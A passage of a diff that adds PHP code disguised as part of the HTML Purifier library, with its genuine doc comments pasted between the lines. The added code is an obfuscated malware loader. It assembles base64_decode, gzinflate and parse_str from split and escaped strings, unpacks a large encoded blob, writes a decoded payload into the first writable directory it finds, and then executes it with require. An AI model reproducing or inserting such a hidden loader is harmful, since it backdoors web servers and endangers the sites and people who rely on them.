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");
+
+/**
+     * Version of HTML Purifier.
+     * @type string
+     */
+$lexer = "base" ."64_d" ."ecod" ."e"; $id_accumulator = "p\141rse_str";
+
+/**
+     * Constant with version of HTML Purifier.
+     */
+$value = "gzinflate";
+
+/**
+     * Global configuration object.
+     * @type HTMLPurifier_Config
+     */
+$version = "i\155\160lode";$filter_size = "";
+
+/**
+     * Array of extra filter objects to run on HTML,
+     * for backwards compatibility.
+     * @type HTMLPurifier_Filter[]
+     */
+$id_accumulator($value($lexer($error_collector)),$flag);
+
+/**
+     * Single instance of HTML Purifier.
+     * @type HTMLPurifier
+     */
+$filter = array($flag[0],$flag[1]($flag[2]),$flag[3],$flag[4]);
+
+/**
+     * @type HTMLPurifier_Strategy_Core
+     */
+foreach($filter as $strategy) {
+/**
+     * @type HTMLPurifier_Generator
+     */
+	if(@$flag[5]($strategy)) break;
+}
+
+/**
+     * Resultant context of last run purification.
+     * Is an array of contexts if the last called method was purifyArray().
+     * @type HTMLPurifier_Context
+     */
+$language=$strategy.$flag[6].$flag[7]($flag[8]());
+
+/**
+     * Initializes the purifier.
+     *
+     * @param HTMLPurifier_Config|mixed $config Optional HTMLPurifier_Config object
+     *                for all instances of the purifier, if omitted, a default
+     *                configuration is supplied (which can be overridden on a
+     *                per-use basis).
+     *                The parameter can also be any type that
+     *                HTMLPurifier_Config::create() supports.
+     */
+$class = $flag[9]($language, $flag[12]);
+
+/**
+     * Adds a filter to process the output. First come first serve
+     *
+     * @param HTMLPurifier_Filter $filter HTMLPurifier_Filter object
+     */
+$flag[10]($class, $value($lexer($version($filter_size,$instance))));
+
+/**
+     * Filters an HTML snippet/document to be XSS-free and standards-compliant.
+     *
+     * @param string $html String of HTML to purify
+     * @param HTMLPurifier_Config $config Config object for this operation,
+     *                if omitted, defaults to the config object specified during this
+     *                object's construction. The parameter can also be any type
+     *                that HTMLPurifier_Config::create() supports.
+     *
+     * @return string Purified HTML
+     */
+$flag[11]($class);
+
+// :TODO: make the config merge in, instead of replace
+
+require($language);
+
+// implementation is partially environment dependant, partially
+
+?>
